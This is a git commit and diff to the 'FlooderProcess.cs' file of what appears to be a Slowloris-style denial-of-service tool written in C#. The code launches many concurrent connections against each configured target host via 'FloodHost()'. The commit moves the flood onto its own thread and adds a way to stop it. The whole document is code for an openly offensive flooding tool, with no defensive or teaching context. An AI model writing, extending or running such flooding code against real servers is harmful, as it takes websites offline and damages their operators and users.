3475e04c49e8d27bbf60e3abb1a278a078db117c
Mateusz Rogalski <77775382+MATEUSZROGALSKI@users.noreply.github.com>
2022-03-02 12:07:45 +0100

    Safe exit and updated flooder (#3)
    safe abort, update flooder process

--- slowloris/FlooderProcess.cs
+++ slowloris/FlooderProcess.cs
@@ -1,28 +1,45 @@
-﻿internal class FlooderProcess
+internal class FlooderProcess
 {
     private readonly Configuration _configuration;
+    private readonly List<LimitedHttpConnection> _connections;
     private readonly List<Task> _tasks;
 
     private bool _isFlooding;
-    public bool IsFlooding { get => _isFlooding; }// ThreadPool.PendingWorkItemCount > 0; }
+    private Thread _floodingThread;
+    public bool IsFlooding { get => _isFlooding; }
 
     public FlooderProcess(Configuration configuration)
     {
         _configuration = configuration;
+        _connections = new List<LimitedHttpConnection>();
         _tasks = new List<Task>();
     }
 
     public void BeginFlood()
     {
-        ThreadPool.SetMaxThreads(_configuration.threadCount, _configuration.ioThreadCount);
-        foreach (TargetInfo target in _configuration.targets)
-        {
-            for (int i = 0; i < target.concurrency; i++)
-            {
-                _tasks.Add(new LimitedHttpConnection(target).FloodHost());
-            }
-        }
         _isFlooding = true;
-        Task.WhenAll(_tasks.ToArray()).ContinueWith(t => _isFlooding = false);
+        _floodingThread = new (async () =>
+        {
+            foreach (TargetInfo target in _configuration.targets)
+            {
+                for (int i = 0; i < target.concurrency; i++)
+                {
+                    var connection = new LimitedHttpConnection(target);
+                    _connections.Add(connection);
+                    _tasks.Add(connection.FloodHost());
+                }
+            }
+            await Task.WhenAll(_tasks.ToArray()).ContinueWith(t => _isFlooding = false);
+        });
+        _floodingThread.Start();
+    }
+
+    public void Stop()
+    {
+        foreach(var connection in _connections)
+        {
+            connection.Stop();
+        }
+        _floodingThread.Join(1000);
     }
 }
